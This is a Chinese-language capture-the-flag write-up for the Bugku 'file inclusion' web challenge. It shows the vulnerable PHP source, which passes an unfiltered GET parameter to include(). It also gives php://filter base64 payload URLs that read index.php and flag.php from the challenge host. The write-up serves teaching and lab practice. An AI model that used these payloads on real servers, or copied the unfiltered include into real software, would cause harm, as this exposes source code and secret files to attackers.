# Bugku CTF 文件包含 WriteUp

## 题目信息

- **题目名称**：文件包含

- **题目平台**：Bugku CTF

- **题目类型**：Web

- **题目分数**：20

---

## 解题思路

1. **漏洞识别**：进入题目场景后，页面存在一个链接 `click me? no`，点击后 URL 变为 `http://171.80.2.169:17405/index.php?file=show.php`。可以明显看出，`file` 参数用于包含指定文件，存在**文件包含漏洞**。

2. **利用思路**：由于 PHP 代码未对 `file` 参数做任何过滤，我们可以利用 PHP 伪协议 `php://filter` 来读取目标文件的源码，从而获取 flag。

---

## 详细解题步骤

### 步骤 1：读取 `index.php` 源码

为了分析后端逻辑，我们首先构造 Payload 读取 `index.php` 自身的源码：

```Plain Text

http://171.80.2.169:17405/index.php?file=php://filter/read=convert.base64-encode/resource=index.php
```

- **`php://filter`**：是一个元封装器，允许在读取流时应用过滤器。

- **`read=convert.base64-encode`**：指定读取时将文件内容进行 Base64 编码，避免 PHP 代码被直接执行。

- **`resource=index.php`**：指定要读取的目标文件。

访问该 URL 后，页面会返回一段 Base64 编码的字符串，将其解码后得到 `index.php` 的源码：

```PHP

<?php
$file = $_GET['file'];
if(isset($file)){
    include($file);
} else {
    echo '<a href="index.php?file=show.php">click me? no</a>';
}
?>
```

从源码可以确认，程序直接将用户可控的 `$file` 参数传入 `include()` 函数，没有任何过滤，漏洞确认无疑。

### 步骤 2：读取 Flag 文件

既然确认了漏洞，我们可以直接构造 Payload 读取 flag 文件。通常 flag 会存放在 `flag.php` 或类似文件中。

构造 Payload：

```Plain Text

http://171.80.2.169:17405/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

将返回的 Base64 字符串解码后，即可得到最终的 flag。
> （注：文档部分内容可能由 AI 生成）